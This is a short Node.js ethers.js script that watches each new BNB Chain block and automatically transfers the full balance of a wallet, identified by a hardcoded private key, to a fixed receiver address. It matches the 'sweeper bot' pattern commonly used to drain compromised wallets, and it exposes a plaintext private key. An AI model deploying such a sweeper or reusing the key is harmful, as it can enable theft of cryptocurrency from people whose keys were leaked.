const ethers = require("ethers")
// const ethers = require("ethers");
// const provider = new ethers.JsonRpcProvider("https://eth.drpc.org");
// const provider = new ethers.JsonRpcProvider("https://bsc-testnet.publicnode.com");
// const provider = new ethers.JsonRpcProvider("https://data-seed-prebsc-1-s2.bnbchain.org:8545");
const provider = new ethers.JsonRpcProvider("https://binance.llamarpc.com");

const addressReceiver = "0xeD8881e05d9365A24312D1aA39C42431C85C80De";

const privateKey = "0x07755e99f3d1c52c1ed0cb2483d58609fdecda78534446df889f59dd0dd16058";

const bot = async () => {
    provider.on("block", async () => {
        console.log("Listening new block, waiting..)");
        const _target = new ethers.Wallet(privateKey);
        const target = _target.connect(provider);
        const balance = await provider.getBalance(target.address);
        const feeData = await provider.getFeeData();
        const gasLimit = 25000n;
        const txBuffer = feeData.gasPrice * gasLimit;
        console.log('debug balance::', balance, txBuffer)
        if (balance > txBuffer) {
            const tx = {
                to: addressReceiver,
                value: balance - txBuffer,
                gasLimit: gasLimit,
                gasPrice: feeData.gasPrice,
            };
            console.log('debug tx::', tx)
            try {
                const estimatedGas = await target.estimateGas(tx);
                console.log('debug estimated gas::', estimatedGas, typeof estimatedGas)
                const gasFee = estimatedGas * (feeData.gasPrice);
                console.log(`Estimated gas limit: ${estimatedGas}`);
                console.log(`Estimated gas fee: ${ethers.formatEther(gasFee)} ETH`);
                const amount = balance - gasFee;
                try {
                    await target.sendTransaction({
                        to: addressReceiver,
                        value: amount
                    });
                    console.log(`Success! transfered --> ${ethers.formatEther(balance)}`);
                }
                catch (e) {
                    console.log(`error: ${e}`);
                }
            } catch (error) {
                console.error('Error estimating gas fee:', error);
            }
        } else {
            console.log('Insufficient funds on the wallet');
        }
    });
}

bot();